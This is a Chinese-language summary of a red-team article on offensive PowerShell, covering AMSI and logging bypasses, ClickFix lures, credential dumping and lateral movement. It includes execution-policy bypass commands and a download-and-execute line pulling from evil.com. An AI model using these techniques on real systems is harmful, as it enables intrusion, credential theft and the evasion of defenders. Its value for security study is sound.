---
title: PowerShell 还没死——红队实战中的攻击武器与免杀技术全景
cover: /home/media/workspace/company/projects/article-curation/assets/cover-09-powershell-red-team-evasion.jpg
---

> 原文: https://screetsec.com/blog/offensive-powershell-for-red-teamer-with-defense-evastion-techniques
> 作者: Screetsec
> 阅读时间: 约 15 分钟

## 一句话总结

PowerShell 连续四年位列攻击者使用最多的工具前五（Red Canary 2025 威胁检测报告），本文从武器化、初始访问、ClickFix 社工链、内网横移到日志清除，完整展示红队视角下的 PowerShell 攻击全链路，并给出每种防御绕过技术的具体代码实现。

## 他们实际做了什么

作者以红队演练（Red Teaming）为背景，构建了一套以 PowerShell 为核心的操作链：先绕过 Windows 内置的 Execution Policy 和 AMSI，然后用 Download Cradle 技术实现无文件载荷投递，接着通过 HTA、Office 宏、LNK 快捷方式将载荷武器化，再结合 ClickFix 社工页诱导用户自执行——最终在目标环境中完成内网侦察、凭据提取、权限提升和日志清除。

## 具体发现了什么 / 能分析出什么

### PowerShell 还在活跃使用

Red Canary 2025 威胁检测报告显示，PowerShell 连续 4 年以上排在攻击者使用工具前五名。Mandiant CEO Kevin Mandia 在安全会议上也确认 PowerShell 仍是威胁行为者最常用的前五种子技术/工具。

活跃 APT 组织持续使用：
- **APT28（俄罗斯）**：用 PowerShell 下载和执行脚本、运行命令
- **FIN7**：用 PowerShell 分发恶意软件、执行侦察和后渗透
- **ToddyCat**：用 PowerShell 脚本进行后渗透数据收集
- **StrongPity**：用 PowerShell 向 Windows Defender 排除列表添加文件
- 此外 APT29、APT33、APT41、Lazarus Group 也在持续使用

### Execution Policy 不是安全边界

Windows 客户端默认禁止执行 .ps1 脚本，但作者展示了 4 种绕过方式：

```
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
Powershell -ExecutionPolicy Bypass -File script.ps1
Powershell -ep Bypass -Command "Invoke-Expression ..."
```

即使企业通过 GPO 强制 `AllSigned` 模式，仍可用 `Invoke-Expression` 在内存中直接执行代码。

### AMSI 绕过的四层技术

**1. 降级到 PowerShell v2**：v2 没有 AMSI 功能，`Powershell -Version 2` 即可绕过扫描。

**2. 字符串混淆（String Kung-Fu）**：6 种混淆方法轮换使用——
- 字符串反转：`$rev[-1..-($rev.Length)] -join ''`
- 字符数组重建、变量拼接、反引号转义、CHAR 编码、操作替换
- 可借助 `Invoke-Obfuscation`（Daniel Bohannon）工具自动化

**3. Reflection 禁用 AMSI**：通过 .NET Reflection 将 `amsiInitFailed` 标志设为 `true`，使 AMSI 初始化失败。公开脚本通常被检测，需叠加字符串混淆。

**4. Memory Patching**：在内存中定位 `amsi.dll` 的 `AmsiScanBuffer` 函数，用 `VirtualProtect` 修改内存保护，然后写入 `MOV EAX, 0x80070057` + `RET` 指令——AMSI 永远返回错误，扫描被跳过。

### 无文件攻击链路

**Download Cradle（下载支架）**：一行命令从远程服务器获取载荷并在内存中执行，磁盘无写入。使用 `Net.WebClient` 或 `IWR` + `IEX` 组合：

```
IEX(IWR "http://evil.com/payloads.ps1" -UseBasicParsing)
```

可与混淆结合，进一步变形：
```
powershell -command "&([String]::Join('',[Char[]](73,69,88))) (New-Object ...)"
```

**反向 Shell**：基于 `System.Net.Sockets.TcpClient` 建立出站连接——出站流量通常比入站更容易穿透防火墙。

### 武器化：三种载荷投递格式

| 格式 | 执行方式 | 关键点 |
|------|---------|--------|
| HTA 文件 | JavaScript/VBScript 调用 PowerShell | 通过 WMI (`Win32_Process.Create`) 生成 PowerShell 进程，父子进程关系更"正常" |
| Office 宏 | VBA `AutoOpen()` 触发 XOR 解码 + 内存执行 | 含反沙箱检查：`FlsAlloc` 检测异常环境 + 10 秒 sleep 验证 |
| LNK 快捷方式 | 快捷方式目标路径嵌入命令 | 可修改已有快捷方式注入后门（HarmJ0y 的 `BackdoorLNK.ps1`） |

VBA 宏方案包含完整的 XOR 编码器（C#）和 shellcode runner（VBA），流程为：`msfvenom` 生成 shellcode → C# XOR 编码 → 嵌入 VBA → `VirtualAlloc` 分配内存 → 解码 → `RtlMoveMemory` 拷贝 → `CreateThread` 执行。

### ClickFix 攻击链（2024-2025 年度热门技术）

核心原理：在网页上伪造 CAPTCHA / 安全验证，诱导用户复制恶意命令，然后按 `Win+R` → `Ctrl+V` → `Enter` 自执行。

作者给出了完整实现：

**基础模板**：伪装的 Webex 会议邀请页 → 点击"安装扩展"按钮 → `navigator.clipboard.writeText()` 将 PowerShell 命令复制到剪贴板 → 引导用户 Win+R 粘贴执行。

**混淆增强**：
- 函数名拆分为数组：`["n","a","v","i","g","a","t","o","r"].join("")` → 动态重建 `navigator.clipboard.writeText`
- 两步点击：第一次复制诱饵内容，第二次才复制真实命令
- 剪贴板链式覆盖：一次点击触发 9 次连续写入，前 8 次为诱饵内容（"Verifying environment..."等），第 9 次才是攻击命令

**组合社工链**：伪造公司面试邀请网站 + 浏览器内嵌窗口（BitB）模拟 Google 登录 + ClickFix CAPTCHA → 完整诱导链。

**规避法医检测**：ClickFix 通过 `Win+R` 运行时，命令记录会留在注册表 `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` 中。作者提供了覆盖 `RunMRU` 条目的 PowerShell 脚本。

**替代方案（FileFix）**：当 `Win+R` 被组策略禁用时，用 `Win+E` 打开资源管理器 + `Alt+D` 定位地址栏 → 粘贴执行。作者给出了伪装为 HR 薪资管理系统的完整 HTML 模板。

### 后渗透技术矩阵

**内网侦察**：PowerView 枚举域用户/计算机/共享，BloodHound + SharpHound 映射 AD 攻击路径。用 `--stealth --nosavecache` 降低检测可见性。

**横向移动**：`Enter-PSSession` / `Invoke-Command`（需 PowerShell Remoting 开启）、WMI 远程命令执行、Empire 框架自动化编排。

**内存执行 .NET 工具**：将 Seatbelt/Mimikatz 等工具 Base64 编码后用 `Assembly.Load()` 在内存中加载执行——不落盘。作者演示了 AMSI 绕过 + 内存加载 Seatbelt 的操作，未触发杀软。

**凭据提取**：原生 PowerShell 通过 Reflection 调用 `MiniDumpWriteDump` 导出 LSASS 进程内存；`Invoke-Mimikatz` 需修改函数名/变量名/API 调用名绕过检测；高级方案是 NetLoader + Codecepticon 源码混淆 + ConfuserEx 二进制混淆三层保护。

**提权**：PowerUp (`Invoke-AllChecks`)、winPeas、PrivescCheck 枚举服务配置错误/DLL 劫持/注册表配置问题。

### 日志清除与覆盖

| 目标 | 技术 |
|------|------|
| Script Block Logging | AST 操纵——构造假的 `Extent` 让日志看到无害代码，实际执行恶意 `EndBlock` |
| Script Block Logging | Reflection 将 `cachedGroupPolicySettings.EnableScriptBlockLogging` 设为 0 |
| ETW | 内存 Patch `EtwEventWrite` 函数，写入 `RET`（0xC3）指令直接返回 |
| ETW | Reflection 将 `PSEtwLogProvider.m_enabled` 设为 0 |
| .NET Profiler | Invisi-Shell：注册 CLR Profiler DLL，Hook `System.Management.Automation.dll` 以完全绕过日志 |
| PowerShell 历史 | 删除历史文件、编辑文件内容、`Set-PSReadlineOption -HistorySaveStyle SaveNothing` |
| Windows Event Log | 插入伪造的合法日志条目，稀释和混淆真实攻击记录 |

## 他们公开了什么 / 交付了什么

文中涉及的公开工具和资源：

- **Invoke-Obfuscation**（Daniel Bohannon）：PowerShell 混淆框架，支持多种混淆技术组合
- **PowerView / PowerSploit**：AD 枚举脚本套件
- **SharpHound / BloodHound**：AD 攻击路径可视化
- **Empire**：PowerShell 后渗透框架，含 Web GUI
- **Seatbelt**：系统安全状态枚举工具
- **NetLoader**（Flangvik）：.NET 程序集内存加载器
- **Codecepticon**（sadreck）：C# 源码混淆工具
- **ConfuserEx 2**：.NET 二进制混淆器
- **PowerUp**（HarmJ0y）：Windows 提权检查工具
- **PrivescCheck**（itm4n）：PowerShell 提权枚举
- **Invisi-Shell**（OmerYa）：基于 .NET Profiler API 的 PowerShell 日志绕过
- **BackdoorLNK.ps1**（HarmJ0y）：LNK 后门注入脚本

文中还包含完整的 ClickFix 攻击链全套 HTML 模板源代码（Webex 伪装 + Antigravity 伪装 + HR Payroll 伪装），以及 Meterpreter shellcode 的 C# XOR 编码器和 VBA shellcode runner 的完整代码。

## 结论 / 建议

作者的核心理念：PowerShell 的生命力取决于目标环境的配置状态——只要它还能运行，就仍然是一个强大的攻击向量。红队评估的价值不在于找到一个漏洞，而在于展示攻击者如何将多个看似无害的操作串联成完整的攻击链。从 Execution Policy 绕过到日志清除，每一步单独看都不致命，但组合起来就是一条可以穿透大多数防御体系的杀伤链。
